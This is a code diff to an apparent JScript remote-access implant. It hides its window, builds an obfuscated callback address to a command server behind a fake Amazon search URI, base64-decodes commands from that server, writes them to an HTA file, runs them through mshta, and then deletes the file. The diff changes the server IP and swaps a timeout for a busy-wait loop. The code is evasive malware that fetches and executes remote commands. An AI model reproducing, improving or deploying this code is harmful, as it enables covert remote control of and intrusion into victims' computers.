@@ -5,8 +5,8 @@ window.blur();
 window.resizeTo(6, 9);
 
 //Define variables
-var ho = "192.168."
-var me = "0.90"
+var ho = "192.168"
+var me = ".0.33"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -169,7 +169,9 @@ function main()
           fd.WriteLine(b64d(jsObject.cmnd.split(" ")[1]))
           fd.close()
           runner.Run("ms" + "hta " + temp + "\\" + id + ".hta", 0, false)
-          runner.Run(cs +" /q /c " + "tim" + "eout " + "/t " + "1", 0, true)
+          for(var i = 0; i < 40000000; i++) {
+            // busy wait to wait for above cmnd to finish
+          }
           fso.DeleteFile(temp + "\\" + id + ".hta")
           retval = "[+] Spawn success..."
         }
